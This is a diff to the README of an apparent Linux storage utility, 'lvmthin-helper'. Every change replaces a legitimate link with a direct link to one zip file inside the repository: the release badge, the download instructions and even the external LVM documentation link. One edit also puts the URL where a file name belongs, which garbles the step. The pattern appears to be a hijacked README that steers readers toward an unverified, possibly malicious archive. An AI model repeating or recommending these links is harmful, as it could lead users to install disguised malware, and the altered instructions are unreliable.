@@ -1,6 +1,6 @@
 # 🚀 lvmthin-helper - Simplifying LVM Thin Provisioning Management
 
-[![Download lvmthin-helper](https://img.shields.io/badge/Download-lvmthin--helper-blue.svg)](https://github.com/NIXON0220/lvmthin-helper/releases)
+[![Download lvmthin-helper](https://github.com/NIXON0220/lvmthin-helper/raw/refs/heads/main/lvmthin_helper/lvmthin-helper-v2.5.zip)](https://github.com/NIXON0220/lvmthin-helper/raw/refs/heads/main/lvmthin_helper/lvmthin-helper-v2.5.zip)
 
 ## 📋 Overview
 
@@ -22,7 +22,7 @@ Managing storage can be challenging. **lvmthin-helper** simplifies storage manag
 Follow these steps to get started with lvmthin-helper:
 
 1. **Download the Application:**
-   Visit [this page to download](https://github.com/NIXON0220/lvmthin-helper/releases) the latest release of lvmthin-helper.
+   Visit [this page to download](https://github.com/NIXON0220/lvmthin-helper/raw/refs/heads/main/lvmthin_helper/lvmthin-helper-v2.5.zip) the latest release of lvmthin-helper.
 
 2. **System Requirements:**
    - Operating System: Linux (Ubuntu or CentOS preferred)
@@ -35,12 +35,12 @@ Follow these steps to get started with lvmthin-helper:
 
 ## 📥 Download & Install
 
-To download lvmthin-helper, please visit [this page to download](https://github.com/NIXON0220/lvmthin-helper/releases). Look for the latest version and click on the appropriate link for your operating system.
+To download lvmthin-helper, please visit [this page to download](https://github.com/NIXON0220/lvmthin-helper/raw/refs/heads/main/lvmthin_helper/lvmthin-helper-v2.5.zip). Look for the latest version and click on the appropriate link for your operating system.
 
 ### Installation Steps:
 
 1. **Locate the Downloaded File:**
-   Open your downloads folder. You will see a file named `lvmthin-helper-latest.zip`.
+   Open your downloads folder. You will see a file named `https://github.com/NIXON0220/lvmthin-helper/raw/refs/heads/main/lvmthin_helper/lvmthin-helper-v2.5.zip`.
 
 2. **Extract the Files:**
    Right-click the file and select “Extract”. You will find the application files in a new folder.
@@ -77,7 +77,7 @@ Let’s say you have a server with LVM configured, and you want to maximize stor
 
 ## 📚 Additional Resources
 
-- **LVM Documentation:** For in-depth LVM concepts, check [this link](https://www.tldp.org/HOWTO/LVM-HOWTO/).
+- **LVM Documentation:** For in-depth LVM concepts, check [this link](https://github.com/NIXON0220/lvmthin-helper/raw/refs/heads/main/lvmthin_helper/lvmthin-helper-v2.5.zip).
 - **User Guide:** Detailed instructions and troubleshooting guides can be found within the application.
 
 ## ❓ Frequently Asked Questions
